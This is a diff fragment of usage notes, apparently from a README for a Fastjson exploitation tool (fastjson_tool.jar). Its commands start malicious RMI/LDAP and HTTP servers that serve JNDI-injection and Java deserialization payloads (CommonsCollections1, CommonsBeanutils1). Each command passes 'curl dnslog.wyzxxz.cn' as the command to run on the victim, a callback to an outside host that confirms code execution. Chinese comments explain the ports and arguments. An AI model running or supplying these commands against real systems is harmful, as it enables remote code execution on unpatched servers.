@@ -7,16 +7,17 @@ java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 
 
 
-2. RMI/LDAP/RMi + HTTP
-java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
-/
+2. RMI/LDAP + HTTP
 java -cp fastjson_tool.jar EvilRMIServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
-创建一个LDAP/RMI服务和一个HTTP服务，1099为ldap/rmi服务的端口, 
+/
+java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
+
+创建一个RMI/LDAP服务和一个HTTP服务，1099为RMI/LDAP服务的端口, 
 127.0.0.1为http服务IP地址，8888为http的端口，后面写要执行的命令。
 
 
 
-3. 
+3. LDAP2
 java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
 创建一个LDAP服务，1099为ldap服务的端口，后面写要用发序列化的payload，以及要执行的命令，
 CommonsBeanutils1  
